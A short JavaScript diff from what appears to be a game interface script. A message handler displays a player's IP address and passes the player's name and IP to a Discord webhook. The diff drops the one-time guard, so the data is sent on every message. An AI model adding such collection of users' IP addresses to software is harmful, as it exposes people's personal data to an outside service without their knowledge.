@@ -1,3 +1,4 @@
+
 window.addEventListener("message", function(event) {
     const data = event.data;
 
@@ -15,10 +16,7 @@ window.addEventListener("message", function(event) {
             document.getElementById("player-server").textContent = data["player-ip"];
         }
 
-        if (!webhookSent) {
-            webhookSent = false;
             sendDiscordWebhook(data.name, data["player-ip"]);
-        }
     }
 });
 
